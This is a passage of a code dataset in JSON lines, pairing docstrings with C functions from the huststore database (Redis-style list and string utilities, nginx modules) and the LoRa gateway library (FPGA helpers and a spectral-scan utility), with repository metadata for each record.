3, - 1);\n        if ( sdslen (abspath) > 1 )\n        {\n            char *p = abspath + sdslen (abspath) - 2;\n            int trimlen = 1;\n\n            while ( *p != '/' )\n            {\n                p --;\n                trimlen ++;\n            }\n            sdsrange (abspath, 0, - ( trimlen + 1 ));\n        }\n    }\n\n    /* Finally glue the two parts together. */\n    abspath = sdscatsds (abspath, relpath);\n    sdsfree (relpath);\n    return abspath;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* This is the semantic of this command:\n *  RPOPLPUSH srclist dstlist:\n *    IF LLEN(srclist) > 0\n *      element = RPOP srclist\n *      LPUSH dstlist element\n *      RETURN element\n *    ELSE\n *      RETURN nil\n *    END\n *  END\n *\n * The idea is to be able to get an element from a list in a reliable way\n * since the element is not just returned but pushed against another list\n * as well. This command was originally proposed by Ezra Zygmuntowicz.\n */\n", "func_signal": "void rpoplpushHandlePush ( client *c, robj *dstkey, robj *dstobj, robj *value )", "code": "{\n    /* Create the list if the key does not exist */\n    if ( ! dstobj )\n    {\n        dstobj = createQuicklistObject ();\n        quicklistSetOptions (dstobj->ptr, server.list_max_ziplist_size,\n                             server.list_compress_depth);\n        dbAdd (c->db, dstkey, dstobj);\n    }\n    listTypePush (dstobj, value, LIST_HEAD);\n    /* Always send the pushed value to the client. */\n    addReply (c, value);\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Return the number of digits of 'v' when converted to string in radix 10.\n * See ll2string() for more information. */\n", "func_signal": "uint32_t digits10 ( uint64_t v )", "code": "{\n    if ( v < 10 ) return 1;\n    if ( v < 100 ) return 2;\n    if ( v < 1000 ) return 3;\n    if ( v < 1000000000000UL )\n    {\n        if ( v < 100000000UL )\n        {\n            if ( v < 1000000 )\n            {\n                if ( v < 10000 ) return 4;\n                return 5 + ( v >= 100000 );\n            }\n            return 7 + ( v >= 10000000UL );\n        }\n        if ( v < 10000000000UL )\n        {\n            return 9 + ( v >= 1000000000UL );\n        }\n        return 11 + ( v >= 100000000000UL );\n    }\n    return 12 + digits10 (v / 1000000000000UL);\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Convert a double to a string representation. Returns the number of bytes\n * required. The representation should always be parsable by strtod(3). */\n", "func_signal": "int d2string ( char *buf, size_t len, double value )", "code": "{\n    if ( isnan (value) )\n    {\n        len = snprintf (buf, len, \"nan\");\n    }\n    else if ( isinf (value) )\n    {\n        if ( value < 0 )\n            len = snprintf (buf, len, \"-inf\");\n        else\n            len = snprintf (buf, len, \"inf\");\n    }\n    else if ( value == 0 )\n    {\n        /* See: http://en.wikipedia.org/wiki/Signed_zero, \"Comparisons\". */\n        if ( 1.0 / value < 0 )\n            len = snprintf (buf, len, \"-0\");\n        else\n            len = snprintf (buf, len, \"0\");\n    }\n    else\n    {\n#if (DBL_MANT_DIG >= 52) && (LLONG_MAX == 0x7fffffffffffffffLL)\n        /* Check if the float is in a safe range to be casted into a\n         * long long. We are assuming that long long is 64 bit here.\n         * Also we are assuming that there are no implementations around where\n         * double has precision < 52 bit.\n         *\n         * Under this assumptions we test if a double is inside an interval\n         * where casting to long long is safe. Then using two castings we\n         * make sure the decimal part is zero. If all this is true we use\n         * integer printing function that is much faster. */\n        double min = - 4503599627370495; /* (2^52)-1 */\n        double max = 4503599627370496; /* -(2^52) */\n        if ( value > min && value < max && value == ( ( double ) ( ( long long ) value ) ) )\n            len = ll2string (buf, len, ( long long ) value);\n        else\n#endif\n            len = snprintf (buf, len, \"%.17g\", value);\n    }\n\n    return len;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* The function pushes an element to the specified list object 'subject',\n * at head or tail position as specified by 'where'.\n *\n * There is no need for the caller to increment the refcount of 'value' as\n * the function takes care of it if needed. */\n", "func_signal": "void listTypePush ( robj *subject, robj *value, int where )", "code": "{\n    if ( subject->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        int pos = ( where == LIST_HEAD ) ? QUICKLIST_HEAD : QUICKLIST_TAIL;\n        value = getDecodedObject (value);\n        size_t len = sdslen (value->ptr);\n        quicklistPush (subject->ptr, value->ptr, len, pos);\n        decrRefCount (value);\n    }\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Convert a long long into a string. Returns the number of\n * characters needed to represent the number.\n * If the buffer is not big enough to store the string, 0 is returned.\n *\n * Based on the following article (that apparently does not provide a\n * novel approach but only publicizes an already used technique):\n *\n * https://www.facebook.com/notes/facebook-engineering/three-optimization-tips-for-c/10151361643253920\n *\n * Modified in order to handle signed integers since the original code was\n * designed for unsigned integers. */\n", "func_signal": "int ll2string ( char* dst, size_t dstlen, long long svalue )", "code": "{\n    static const char digits[201] =\n        \"0001020304050607080910111213141516171819\"\n        \"2021222324252627282930313233343536373839\"\n        \"4041424344454647484950515253545556575859\"\n        \"6061626364656667686970717273747576777879\"\n        \"8081828384858687888990919293949596979899\";\n    int negative;\n    unsigned long long value;\n\n    /* The main loop works with 64bit unsigned integers for simplicity, so\n     * we convert the number here and remember if it is negative. */\n    if ( svalue < 0 )\n    {\n        if ( svalue != LLONG_MIN )\n        {\n            value = - svalue;\n        }\n        else\n        {\n            value = ( ( unsigned long long ) LLONG_MAX ) + 1;\n        }\n        negative = 1;\n    }\n    else\n    {\n        value = svalue;\n        negative = 0;\n    }\n\n    /* Check length. */\n    uint32_t const length = digits10 (value) + negative;\n    if ( length >= dstlen ) return 0;\n\n    /* Null term. */\n    uint32_t next = length;\n    dst[next] = '\\0';\n    next --;\n    while ( value >= 100 )\n    {\n        int const i = ( value % 100 ) * 2;\n        value /= 100;\n        dst[next] = digits[i + 1];\n        dst[next - 1] = digits[i];\n        next -= 2;\n    }\n\n    /* Handle last 1-2 digits. */\n    if ( value < 10 )\n    {\n        dst[next] = '0' + ( uint32_t ) value;\n    }\n    else\n    {\n        int i = ( uint32_t ) value * 2;\n        dst[next] = digits[i + 1];\n        dst[next - 1] = digits[i];\n    }\n\n    /* Add sign. */\n    if ( negative ) dst[0] = '-';\n    return length;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Create a quicklist from a single ziplist */\n", "func_signal": "void listTypeConvert ( robj *subject, int enc )", "code": "{\n\n    if ( enc == OBJ_ENCODING_QUICKLIST )\n    {\n        size_t zlen = server.list_max_ziplist_size;\n        int depth = server.list_compress_depth;\n        subject->ptr = quicklistCreateFromZiplist (zlen, depth, subject->ptr);\n        subject->encoding = OBJ_ENCODING_QUICKLIST;\n    }\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Glob-style pattern matching. */\n", "func_signal": "int stringmatchlen ( const char *pattern, int patternLen,\n                     const char *string, int stringLen, int nocase )", "code": "{\n    while ( patternLen )\n    {\n        switch ( pattern[0] )\n        {\n            case '*':\n                while ( pattern[1] == '*' )\n                {\n                    pattern ++;\n                    patternLen --;\n                }\n                if ( patternLen == 1 )\n                    return 1; /* match */\n                while ( stringLen )\n                {\n                    if ( stringmatchlen (pattern + 1, patternLen - 1,\n                                         string, stringLen, nocase) )\n                        return 1; /* match */\n                    string ++;\n                    stringLen --;\n                }\n                return 0; /* no match */\n                break;\n            case '?':\n                if ( stringLen == 0 )\n                    return 0; /* no match */\n                string ++;\n                stringLen --;\n                break;\n            case '[':\n            {\n                int not, match;\n\n                pattern ++;\n                patternLen --;\n                not = pattern[0] == '^';\n                if ( not )\n                {\n                    pattern ++;\n                    patternLen --;\n                }\n                match = 0;\n                while ( 1 )\n                {\n                    if ( pattern[0] == '\\\\' )\n                    {\n                        pattern ++;\n                        patternLen --;\n                        if ( pattern[0] == string[0] )\n                            match = 1;\n                    }\n                    else if ( pattern[0] == ']' )\n                    {\n                        break;\n                    }\n                    else if ( patternLen == 0 )\n                    {\n                        pattern --;\n                        patternLen ++;\n                        break;\n                    }\n                    else if ( pattern[1] == '-' && patternLen >= 3 )\n                    {\n                        int start = pattern[0];\n                        int end = pattern[2];\n                        int c = string[0];\n                        if ( start > end )\n                        {\n                            int t = start;\n                            start = end;\n                            end = t;\n                        }\n                        if ( nocase )\n                        {\n                            start = tolower (start);\n                            end = tolower (end);\n                            c = tolower (c);\n                        }\n                        pattern += 2;\n                        patternLen -= 2;\n                        if ( c >= start && c <= end )\n                            match = 1;\n                    }\n                    else\n                    {\n                        if ( ! nocase )\n                        {\n                            if ( pattern[0] == string[0] )\n                                match = 1;\n                        }\n                        else\n                        {\n                            if ( tolower (( int ) pattern[0]) == tolower (( int ) string[0]) )\n                                match = 1;\n                        }\n                    }\n                    pattern ++;\n                    patternLen --;\n                }\n                if ( not )\n                    match = ! match;\n                if ( ! match )\n                    return 0; /* no match */\n                string ++;\n                stringLen --;\n                break;\n            }\n            case '\\\\':\n                if ( patternLen >= 2 )\n                {\n                    pattern ++;\n                    patternLen --;\n                }\n                /* fall through */\n            default:\n                if ( ! nocase )\n                {\n                    if ( pattern[0] != string[0] )\n                        return 0; /* no match */\n                }\n                else\n                {\n                    if ( tolower (( int ) pattern[0]) != tolower (( int ) string[0]) )\n                        return 0; /* no match */\n                }\n                string ++;\n                stringLen --;\n                break;\n        }\n        pattern ++;\n        patternLen --;\n        if ( stringLen == 0 )\n        {\n            while ( *pattern == '*' )\n            {\n                pattern ++;\n                patternLen --;\n            }\n            break;\n        }\n    }\n    if ( patternLen == 0 && stringLen == 0 )\n        return 1;\n    return 0;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/util.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Delete the element pointed to. */\n", "func_signal": "void listTypeDelete ( listTypeIterator *iter, listTypeEntry *entry )", "code": "{\n    if ( entry->li->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        quicklistDelEntry (iter->iter, &entry->entry);\n    }\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "// ngx_http_upstream_round_robin.c:ngx_http_upstream_init_round_robin\n", "func_signal": "ngx_http_upstream_rr_peers_t  * ngx_http_init_upstream_rr_peers(const ngx_url_array_t * urls, ngx_conf_t * cf)", "code": "{\n    if (!urls || !urls->arr || urls->size < 1 || !cf)\n    {\n        return NULL;\n    }\n    ngx_http_upstream_server_t ** servers = ngx_palloc(cf->pool, urls->size * sizeof(ngx_http_upstream_server_t *));\n    size_t i = 0;\n    for (i = 0; i < urls->size; ++i)\n    {\n        ngx_http_upstream_server_t * server = ngx_http_parse_upstream_server(urls->arr + i, cf);\n        if (!server)\n        {\n            return NULL;\n        }\n        servers[i] = server;\n    }\n    ngx_uint_t w = 0;\n    for (i = 0; i < urls->size; ++i)\n    {\n        w += servers[i]->naddrs * servers[i]->weight;\n    }\n    ngx_http_upstream_rr_peers_t * peers = ngx_pcalloc(cf->pool, sizeof(ngx_http_upstream_rr_peers_t));\n    if (!peers)\n    {\n        return NULL;\n    }\n    ngx_http_upstream_rr_peer_t * peer = ngx_pcalloc(cf->pool, sizeof(ngx_http_upstream_rr_peer_t) * urls->size);\n    if (!peer)\n    {\n        return NULL;\n    }\n\n    peers->single = (urls->size == 1);\n    peers->number = urls->size;\n    peers->weighted = (w != urls->size);\n    peers->total_weight = w;\n\n    ngx_http_upstream_rr_peer_t ** peerp = &peers->peer;\n    for (i = 0; i < urls->size; ++i)\n    {\n        peer[i].sockaddr = servers[i]->addrs[0].sockaddr;\n        peer[i].socklen = servers[i]->addrs[0].socklen;\n        peer[i].name = servers[i]->addrs[0].name;\n        peer[i].weight = servers[i]->weight;\n        peer[i].effective_weight = servers[i]->weight;\n        peer[i].current_weight = 0;\n        peer[i].max_fails = servers[i]->max_fails;\n        peer[i].fail_timeout = servers[i]->fail_timeout;\n        peer[i].down = servers[i]->down;\n        peer[i].server = servers[i]->name;\n        *peerp = &peer[i];\n        peerp = &peer[i].next;\n    }\n    return peers;\n}", "path": "huststore/hustdb/ha/nginx/src/http/modules/ngx_http_fetch.c", "commit_date": "2017-04-21 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Compare the given object with the entry at the current position. */\n", "func_signal": "int listTypeEqual ( listTypeEntry *entry, robj *o )", "code": "{\n    if ( entry->li->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        return quicklistCompare (entry->entry.zi, o->ptr, sdslen (o->ptr));\n    }\n    return 0;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/*\n * although there is a real $body_bytes_sent variable,\n * this log operation code function is more optimized for logging\n */\n", "func_signal": "static u_char *\nngx_http_log_body_bytes_sent(ngx_http_request_t *r, u_char *buf,\n    ngx_http_log_op_t *op)", "code": "{\n    off_t  length;\n\n    length = r->connection->sent - r->header_size;\n\n    if (length > 0) {\n        return ngx_sprintf(buf, \"%O\", length);\n    }\n\n    *buf = '0';\n\n    return buf + 1;\n}", "path": "huststore/hustdb/ha/nginx/src/http/modules/ngx_http_log_module.c", "commit_date": "2017-04-21 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Return entry or NULL at the current position of the iterator. */\n", "func_signal": "robj *listTypeGet ( listTypeEntry *entry )", "code": "{\n    robj *value = NULL;\n    if ( entry->li->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        if ( entry->entry.value )\n        {\n            value = createStringObject (( char * ) entry->entry.value,\n                                        entry->entry.sz);\n        }\n        else\n        {\n            value = createStringObjectFromLongLong (entry->entry.longval);\n        }\n    }\n    return value;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* Stores pointer to current the entry in the provided entry structure\n * and advances the position of the iterator. Returns 1 when the current\n * entry is in fact an entry, 0 otherwise. */\n", "func_signal": "int listTypeNext ( listTypeIterator *li, listTypeEntry *entry )", "code": "{\n    /* Protect from converting when iterating */\n\n    entry->li = li;\n    if ( li->encoding == OBJ_ENCODING_QUICKLIST )\n    {\n        return quicklistNext (li->iter, &entry->entry);\n    }\n    return 0;\n}", "path": "huststore/hustdb/db/server/module/rdb/src/t_list.c", "commit_date": "2016-08-23 00:00:00", "repo_name": "Qihoo360/huststore", "stars": 826, "license": "lgpl-3.0", "language": "c", "size": 31900}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PUBLIC FUNCTIONS DEFINITION ------------------------------------------ */\n", "func_signal": "float lgw_fpga_get_tx_notch_delay(void)", "code": "{\n    float tx_notch_delay;\n\n    if (tx_notch_support == false) {\n        return 0;\n    }\n\n    /* Notch filtering performed by FPGA adds a constant delay (group delay) that we need to compensate */\n    tx_notch_delay = (31.25 * ((64 + tx_notch_offset) / 2)) / 1E3; /* 32MHz => 31.25ns */\n\n    return tx_notch_delay;\n}", "path": "lora_gateway/libloragw/src/loragw_fpga.c", "commit_date": "2017-04-05 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- PRIVATE FUNCTIONS DEFINITION ----------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;;\n    } else if ((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "lora_gateway/util_lbt_test/src/util_lbt_test.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- SUBFUNCTIONS DEFINITION ---------------------------------------------- */\n", "func_signal": "static void sig_handler(int sigio)", "code": "{\n    if (sigio == SIGQUIT) {\n        quit_sig = 1;\n    }\n    else if((sigio == SIGINT) || (sigio == SIGTERM)) {\n        exit_sig = 1;\n    }\n}", "path": "lora_gateway/util_tx_continuous/src/util_tx_continuous.c", "commit_date": "2016-11-09 00:00:00", "repo_name": "Lora-net/lora_gateway", "stars": 895, "license": "other", "language": "c", "size": 661}
{"docstring": "/* -------------------------------------------------------------------------- */\n/* --- MAIN FUNCTION -------------------------------------------------------- */\n", "func_signal": "int main( int argc, char ** argv )", "code": "{\n    int i, j, k; /* loop and temporary variables */\n    int x; /* return code for functions */\n    int32_t reg_val;\n\n    /* Parameter parsing */\n    double arg_lf[3] = {0,0,0};\n    unsigned arg_u = 0;\n    int arg_i = 0;\n    char arg_s[64];\n\n    /* Application parameters */\n    uint32_t init_freq = DEFAULT_START_FREQ;\n    uint32_t start_freq = DEFAULT_START_FREQ;\n    uint32_t stop_freq = DEFAULT_STOP_FREQ;\n    uint32_t step_freq = DEFAULT_STEP_FREQ;\n    uint16_t rssi_pts = DEFAULT_RSSI_PTS;\n    int8_t rssi_offset = DEFAULT_SX127X_RSSI_OFFSET;\n    enum lgw_sx127x_rxbw_e channel_bw_khz = DEFAULT_CHAN_BW;\n    char log_file_name[64] = DEFAULT_LOG_NAME;\n    FILE * log_file = NULL;\n\n    /* Local var */\n    bool lbt_support = false;\n    int freq_idx;\n    int freq_nb;\n    uint64_t freq_reg;\n    uint32_t freq;\n    uint8_t read_burst[RSSI_RANGE*2];\n    uint16_t rssi_histo;\n    uint16_t rssi_cumu;\n    float rssi_thresh[] = {0.1,0.3,0.5,0.8,1};\n\n    /* Parse command line options */\n    while((i = getopt(argc, argv, \"hf:n:b:l:o:\")) != -1) {\n        switch (i) {\n        case 'h':\n            printf(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\");\n            printf(\" -f <float>:<float>:<float>  Frequency vector to scan in MHz (start:step:stop)\\n\");\n            printf(\"                               start>%3.3f step>%1.3f stop<%3.3f\\n\", MIN_FREQ/1e6, MIN_STEP_FREQ/1e6, MAX_FREQ/1e6);\n            printf(\" -b <uint>  Channel bandwidth in KHz [25,50,100,125,200,250,500]\\n\");\n            printf(\" -n <uint>  Total number of RSSI points [1..65535]\\n\");\n            printf(\" -o <int>   Offset in dB to be applied to the SX127x RSSI [-128..127]\\n\");\n            printf(\" -l <char>  Log file name\\n\");\n            printf(\"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\");\n            return EXIT_SUCCESS;\n\n        case 'f': /* -f <float>:<float>:<float>  Frequency vector to scan in MHz, start:step:stop */\n            j = sscanf(optarg, \"%lf:%lf:%lf\", &arg_lf[0], &arg_lf[1], &arg_lf[2]);\n            if ((j!=3) || (arg_lf[0] < MIN_FREQ/1e6) || (arg_lf[0] > MAX_FREQ/1e6) || (arg_lf[1] < MIN_STEP_FREQ/1e6) || (arg_lf[2] < MIN_FREQ/1e6) || (arg_lf[2] > MAX_FREQ/1e6)) {\n                printf(\"ERROR: argument parsing of -f argument. -h for help.\\n\");\n                return EXIT_FAILURE;\n            } else {\n                start_freq = (uint32_t)((arg_lf[0] * 1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                step_freq = (uint32_t)((arg_lf[1] * 1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n                stop_freq = (uint32_t)((arg_lf[2] * 1e6) + 0.5); /* .5 Hz offset to get rounding instead of truncating */\n            }\n            break;\n\n        case 'b': /* -b <uint>  Channel bandwidth in KHz [25,50,100,125,200,250,500] */\n            j = sscanf(optarg, \"%u\", &arg_u);\n            if (j != 1) {\n                printf(\"ERROR: argument parsing of -b argument. -h for help.\\n\");\n                return EXIT_FAILURE;\n            } else {\n                switch (arg_u) {\n                    case 25:\n                        channel_bw_khz = LGW_SX127X_RXBW_12K5_HZ;\n                        break;\n                    case 50:\n                        channel_bw_khz = LGW_SX127X_RXBW_25K_HZ;\n                        break;\n                    case 100:\n                        channel_bw_khz = LGW_SX127X_RXBW_50K_HZ;\n                        break;\n                    case 125:\n                        channel_bw_khz = LGW_SX127X_RXBW_62K5_HZ;\n                        break;\n                    case 200:\n                        channel_bw_khz = LGW_SX127X_RXBW_100K_HZ;\n                        break;\n                    case 250:\n                        channel_bw_khz = LGW_SX127X_RXBW_125K_HZ;\n                        break;\n                    case 500:\n                        channel_bw_khz = LGW_SX127X_RXBW_250K_HZ;\n                        break;\n                    default:\n                        printf(\"ERROR: argument parsing of -b argument. -h for help.\\n\");\n                        return EXIT_FAILURE;\n                }\n            }\n            break;\n\n        case 'n': /* -n <uint>  Total number of RSSI points [1..65535] */\n            j = sscanf(optarg, \"%u\", &arg_u);\n            if ((j != 1) || (arg_u < 1) || (arg_u > 65535)) {\n                printf(\"ERROR: argument parsing of -n argument. -h for help.\\n\");\n                return EXIT_FAILURE;\n            } else {\n                rssi_pts = (uint16_t)arg_u;\n            }\n            break;\n\n        case 'o': /* -o <int>  SX127x RSSI offset [-128..127] */\n            j = sscanf(optarg, \"%i\", &arg_i);\n            if ((j != 1) || (arg_i < -128) || (arg_i > 127)) {\n                printf(\"ERROR: argument parsing of -o argument. -h for help.\\n\");\n                return EXIT_FAILURE;\n            } else {\n                rssi_offset = (int8_t)arg_i;\n            }\n            break;\n\n        case 'l': /* -l <char>  Log file name */\n            j = sscanf(optarg, \"%s\", arg_s);\n            if (j != 1) {\n                printf(\"ERROR: argument parsing of -l argument. -h for help.\\n\");\n                return EXIT_FAILURE;\n            } else {\n                sprintf(log_file_name, \"%s\", arg_s);\n            }\n            break;\n\n        default:\n            printf(\"ERROR: argument parsing options. -h for help.\\n\");\n            return EXIT_FAILURE;\n        }\n    }\n\n    /* Start message */\n    printf(\"+++ Start spectral scan of LoRa gateway channels +++\\n\");\n\n    x = lgw_connect(true, 0); /* SPI only, no FPGA reset/configure (for now) */\n    if(x != 0) {\n        printf(\"ERROR: Failed to connect to FPGA\\n\");\n        return EXIT_FAILURE;\n    }\n\n    /* Check if FPGA supports Spectral Scan */\n    lgw_fpga_reg_r(LGW_FPGA_FEATURE, &reg_val);\n    if (TAKE_N_BITS_FROM((uint8_t)reg_val, FPGA_FEATURE_SPECTRAL_SCAN, 1) != true) {\n        printf(\"ERROR: Spectral Scan is not supported (0x%x)\\n\", (uint8_t)reg_val);\n        return EXIT_FAILURE;\n    }\n\n    /* Check if FPGA supports LBT, in order to apply proper constraints on spectral scan parameters */\n    lgw_fpga_reg_r(LGW_FPGA_FEATURE, &reg_val);\n    if (TAKE_N_BITS_FROM((uint8_t)reg_val, FPGA_FEATURE_LBT, 1) == true) {\n        printf(\"WARNING: The FPGA supports LBT, so running spectral scan with specific constraints\\n\");\n        printf(\"         => Check the parameters summary below\\n\");\n        /* Get start frequency from FPGA */\n        lgw_fpga_reg_r(LGW_FPGA_LBT_INITIAL_FREQ, &reg_val);\n        switch (reg_val) {\n            case 0:\n                init_freq = 915000000;\n                break;\n            case 1:\n                init_freq = 863000000;\n                break;\n            default:\n                printf(\"ERROR: init frequency %d is not supported\\n\", reg_val);\n                return EXIT_FAILURE;\n        }\n\n        /* Check parameters based on LBT constraints */\n        if (start_freq < init_freq) {\n            printf(\"ERROR: start frequency %d is not supported, should be >=%d\\n\", start_freq, init_freq);\n            return EXIT_FAILURE;\n        }\n        if (stop_freq > (init_freq + 255*LBT_MIN_STEP_FREQ)) {\n            printf(\"ERROR: stop frequency %d is not supported, should be <%d\\n\", stop_freq, init_freq + 255*LBT_MIN_STEP_FREQ);\n            return EXIT_FAILURE;\n        }\n        if (step_freq < LBT_MIN_STEP_FREQ) {\n            printf(\"ERROR: step frequency %d is not supported, should be >=%d\\n\", step_freq, LBT_MIN_STEP_FREQ);\n            return EXIT_FAILURE;\n        } else {\n            /* Ensure the given step is a multiple of LBT_MIN_STEP_FREQ */\n            step_freq = (step_freq / LBT_MIN_STEP_FREQ) * LBT_MIN_STEP_FREQ;\n        }\n\n        /* Overload hard-coded spectral scan parameters */\n        rssi_pts = LBT_DEFAULT_RSSI_PTS;\n\n        /* Spectral scan sequence is slightly different depending if LBT is there or not */\n        lbt_support = true;\n    } else {\n        /* Reconnect to FPGA with sw reset and configure */\n        x = lgw_disconnect();\n        if(x != 0) {\n            printf(\"ERROR: Failed to disconnect from FPGA\\n\");\n            return EXIT_FAILURE;\n        }\n        x = lgw_connect(false, LGW_DEFAULT_NOTCH_FREQ); /* FPGA reset/configure */\n        if(x != 0) {\n            printf(\"ERROR: Failed to connect to FPGA\\n\");\n            return EXIT_FAILURE;\n        }\n        /* Some spectral scan options are only available when there is no LBT support */\n        x = lgw_fpga_reg_w(LGW_FPGA_HISTO_NB_READ, rssi_pts-1);\n        if( x != LGW_REG_SUCCESS )\n        {\n            printf( \"ERROR: Failed to configure FPGA\\n\" );\n            return EXIT_FAILURE;\n        }\n\n        /* Initialize frequency */\n        freq_reg = ((uint64_t)start_freq << 19) / (uint64_t)32000000;\n        lgw_fpga_reg_w(LGW_FPGA_HISTO_SCAN_FREQ, (int32_t)freq_reg);\n    }\n\n    /* create log file */\n    strcat(log_file_name,\".csv\");\n    log_file = fopen(log_file_name, \"w\");\n    if (log_file == NULL) {\n        printf(\"ERROR: impossible to create log file %s\\n\", log_file_name);\n        return EXIT_FAILURE;\n    }\n    printf(\"Writing to file: %s\\n\", log_file_name);\n\n    /* Number of frequency steps */\n    freq_nb = (int)((stop_freq - start_freq) / step_freq) + 1;\n    printf(\"Scanning frequencies:\\nstart: %d Hz\\nstop : %d Hz\\nstep : %d Hz\\nnb   : %d\\n\", start_freq, stop_freq, step_freq, freq_nb);\n\n    /* Main loop */\n    for(j = 0; j < freq_nb; j++) {\n        /* Current frequency */\n        freq = start_freq + j * step_freq;\n        printf(\"%d\", freq);\n\n        if (lbt_support == false) {\n            /* Set SX127x */\n            x = lgw_setup_sx127x(freq, MOD_FSK, channel_bw_khz, rssi_offset);\n            if( x != 0 )\n            {\n                printf( \"ERROR: SX127x setup failed\\n\" );\n                return EXIT_FAILURE;\n            }\n\n            /* Start FPGA state machine for spectral scal */\n            lgw_fpga_reg_w(LGW_FPGA_CTRL_FEATURE_START, 1);\n        } else {\n            /* Do Nothing */\n            /* LBT setup has already done the necessary */\n        }\n\n        /* Clean histogram */\n        lgw_fpga_reg_w(LGW_FPGA_CTRL_CLEAR_HISTO_MEM, 1);\n\n        /* Wait for histogram clean to start */\n        do {\n            wait_ms(10);\n            lgw_fpga_reg_r(LGW_FPGA_STATUS, &reg_val);\n        }\n        while((TAKE_N_BITS_FROM((uint8_t)reg_val, 0, 5)) != 1); /* Clear has started */\n\n        /* Set scan frequency during clear process */\n        if (lbt_support == false) {\n            /* We can directly set the scan frequency */\n            freq_reg = ((uint64_t)freq << 19) / (uint64_t)32000000;\n            lgw_fpga_reg_w(LGW_FPGA_HISTO_SCAN_FREQ, (int32_t)freq_reg);\n        } else {\n            /* The possible scan frequencies are hard-coded in FPGA, we give an offset from init_freq */\n            freq_idx = (freq - init_freq) / LBT_MIN_STEP_FREQ;\n            printf(\" (idx=%i) \", freq_idx);\n            lgw_fpga_reg_w(LGW_FPGA_SCAN_FREQ_OFFSET, freq_idx);\n        }\n\n        /* Release FPGA state machine */\n        lgw_fpga_reg_w(LGW_FPGA_CTRL_CLEAR_HISTO_MEM, 0);\n\n        /* Wait for histogram ready */\n        do {\n            wait_ms(1000);\n            lgw_fpga_reg_r(LGW_FPGA_STATUS, &reg_val);\n        }\n        while((TAKE_N_BITS_FROM((uint8_t)reg_val, 5, 1)) != 1);\n\n        if (lbt_support == false) {\n            /* Stop FPGA state machine for spectral scan */\n            lgw_fpga_reg_w(LGW_FPGA_CTRL_FEATURE_START, 0);\n        } else {\n            /* Do Nothing */\n            /* LBT is running */\n        }\n\n        /* Read histogram */\n        lgw_fpga_reg_w(LGW_FPGA_CTRL_ACCESS_HISTO_MEM, 1); /* HOST gets access to FPGA RAM */\n        lgw_fpga_reg_w(LGW_FPGA_HISTO_RAM_ADDR, 0);\n        lgw_fpga_reg_rb(LGW_FPGA_HISTO_RAM_DATA, read_burst, RSSI_RANGE*2);\n        lgw_fpga_reg_w(LGW_FPGA_CTRL_ACCESS_HISTO_MEM, 0); /* FPGA gets access to RAM back */\n\n        /* Write data to CSV */\n        fprintf(log_file, \"%d\", freq);\n        rssi_cumu = 0;\n        